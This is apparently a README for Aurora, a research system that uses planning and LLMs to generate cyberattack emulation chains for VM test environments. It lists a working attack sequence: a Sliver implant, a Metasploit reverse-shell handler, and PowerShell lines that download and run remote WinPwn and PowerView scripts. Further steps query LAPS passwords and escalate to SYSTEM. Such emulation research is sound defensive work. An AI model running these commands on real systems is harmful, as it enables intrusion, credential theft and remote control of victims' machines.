---
layout: default
---

# Introduction
<p><a href="https://arxiv.org/pdf/2407.16928"><img alt="Paper thumbnail" align="right" width="150" src="assets/images/First_page.png"></a></p>

- Aurora automatically creates cyberattacks using third-party tools and mimics real-world attackers by analyzing threat intelligence reports.

- We designed a modular system(Attack Action Linking Model , AALM) to organize attack steps and combined classical planning with LLM to solve challenges in building multi-step attacks.
  
- Experiments proved Aurora generates higher-quality and more diverse attack chains than existing tools or cutting-edge AI models.
 
- We published the first large-scale, automatically generated dataset with 1,000+ attack chains, including scripts and environments.
  
Our paper: [From Sands to Mansions: Towards Automated Cyberattack Emulation with Classical Planning and Large Language Models](https://arxiv.org/pdf/2407.16928)

# Attack Demos

## Attack chains
This folder stores attack chains generated by Aurora, which can be found in the [exapmles](https://github.com/LexusWang/Aurora-demos/tree/main/examples). Each folder in `examples` contains an attach chain, which includes the emulation plan details and attack steps.

For more details, please refer to the [introduction to attack chains](https://github.com/LexusWang/Aurora-demos/blob/main/docs/attack_chain_introduction.md).

## Emulation Topology
<p align="center">
  <img width="800" src="assets/images/the%20emulation%20infrastructure.jpg" alt="cli output"/>
</p>
If you want to set up a more realistic attack environment, this [doc](https://github.com/LexusWang/Aurora-demos/blob/main/docs/Emulation_Infrastructure_info.md) outlines a network topology with attacker and victim setups, including firewalls and DNS_servers to better mimic real-world attack scenarios. Just follow the guide to configure your environment! 

## Infrastructure Download
Use the generated attack chain YML file and run `pull.py` to automatically download and deploy the corresponding virtual machine environment (works with VirtualBox; VMware users can manually deploy the downloaded files).
Two download modes are supported:

No duplicate downloads: If the file already exists, it will prompt whether to directly proceed with deployment.

Allow duplicate downloads: Files will be automatically renamed to avoid conflicts.

During initial deployment (including repeated deployments), the VM will not start automatically, allowing users to modify configurations.

By default, two network adapters will be configured: one in NAT mode and the other in Host-only mode. Make sure the required network is configured in VirtualBox; otherwise, the VM may fail to start.

``` bash
## Prohibiting duplicate deployment
python pull.py -p #yml_file_path -d #storage_path -vm #VBoxManage.exe_path --url_table #url_table_path -nr -firewall #yes/no
## Allowing duplicate downloads
python pull.py -p #yml_file_path -d #storage_path -vm #VBoxManage.exe_path --url_table #url_table_path -r -firewall #yes/no
```
- `yml_file_path`：The path of the attack chain yml file  
- `storage_path`：The storage path of the downloaded target machine file  
- `VBoxManage.exe_path`：The VBoxManage.exe path of VirtualBox is used for invocation  
- `url_table_path`：The path of the Download Link mapping table (url_table.csv)  
- `-nr`：Prohibiting duplicate deployment  
- `-r`：Allowing duplicate downloads  
- `-firewall`：Use pfSense firewall to isolate the attack aircraft and the target aircraft  
We've detailed multiple victim machine [links](https://github.com/LexusWang/Aurora-demos/blob/main/docs/environment_introduction.md),you can customize based on your needs.

## Script Execution
```bash
python ../results/execution_xxxx.py
```
Click the following headings for details:
<details>
<summary>EXAMPLE-1_execution_keyboard_input_simulated-3</summary>

This attack plan uses `Metasploit` and `Sliver` tools to compromise Windows systems. First, a listener is established to capture incoming connections. A malicious `Sliver` payload is then created and delivered by tricking the victim into downloading/running it, granting remote access. Finally, this access is leveraged to deploy a stealthy `Meterpreter` payload via `Sliver` for data exfiltration (`keyboard input simulation`)
<p align="center">
  <img width="800" src="assets/images/example1.gif" alt="cli output"/>
</p>

</details>

<details>
<summary>EXAMPLE-2_execution_file_info_known-1</summary>

This attack simulation targets Windows systems using `Sliver` and `Metasploit`. It starts by creating a `Sliver` implant (malicious.exe) and tricking the victim into downloading/running it as Administrator. This grants attackers an elevated `Sliver` C2 session. Next, a `Metasploit` listener is set up to catch a reverse HTTPS payload ("meterpreter_reverse_http") deployed through `Sliver`, enabling a stealthy `Meterpreter` session. Finally, attackers use `Meterpreter` to search for sensitive files (like *.txt) on compromised machines.

<p align="center">
  <img width="800" src="assets/images/example2.gif" alt="cli output"/>
</p>
</details>

## Scenario Steps
Each `uuid` encompasses an `executor`, within which the `command` parameter specifies the actual attack command that needs to be executed. You should proceed manually through the attack steps in the sequence of the UUIDs.

| Steps        | Description	                  | Executor                 |
|:-------------|:-------------------------------|:-------------------------|
| Implant Generation | Sliver generates implant for Windows platform and enables http monitoring. | # sliver<br>> generate --arch amd64 --os windows --http 10.0.0.101 --save .<br>> http |
| Execution | Download&Execute the sliver implant.   | # sliver<br>> sessions -i session_id |
| Directory Disclosure | The pwd command in a Sliver session prints the current working directory of the active session. | # sliver<br>> pwd   |
| Build meterpreter session  |Use sliver and msf linkage, msf starts monitoring, sliver bounces a shell back,so that msf establishes a shell connection with the target host. | # msfconsole<br>> use exploit/multi/handler<br>> set payload windows/x64/meterpreter_reverse_https<br>> set lport 9091<br>> set lhost 192.168.130.128<br>> exploit -j -z<br> # sliver<br>> msf --lhost 192.168.130.128 -l 9091<br># msfconsole<br>> sessions 1 |
| Process Enumeration | The command lists remote system processes. | #sliver<br>> ps  |
| User Context Verification | Simply collect the user information of the target machine. | # sliver<br>> whoami   |
| Interactive Shell Access | Open an interactive shell on the compromised machine.   |  # sliver<br>> shell |
| Printercheck  | To search for printers or potential vulnerabilities related to printers. | # powershell<br>> $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'<br>> iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')<br>> printercheck -noninteractive -consoleoutput |
| Enumerate Active Directory Users  | Utilizing ADSISearcher to enumerate users within Active Directory. | # powershell<br>> ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()  |
| Get-ForestTrust | Use PowerView's Get-ForestTrust to show forest trust info.   | # powershell<br>> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12<br>IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose |
| Suspicious LAPS Query           | Executes LDAP query via Get-ADComputer to list Microsoft LAPS attributes.      | # powershell<br>> Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime   |
| WMIObject Group Discovery   | To enumerate local groups on the endpoint. | # powershell<br>> Get-WMIObject Win32_Group |
| Enumerate accounts    | Enumerate all accounts via PowerShell. |  # powershell<br>> net user /domain<br>> get-localgroupmember -group Users<br>> get-aduser -filter *  |
| Pop System Shell | Pop System Shell using Token Manipulation technique via function of WinPwn.   | # powershell<br>> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem  |
|UI Control Manipulation          | The command is used to control user interface components on a compromised system.      | # msfconsole<br>> uictl [enable/disable] [keyboard/mouse/all]  |



**_Licensing_**
```
To discuss licensing opportunities, please reach out to aurora@[] or directly to .
```

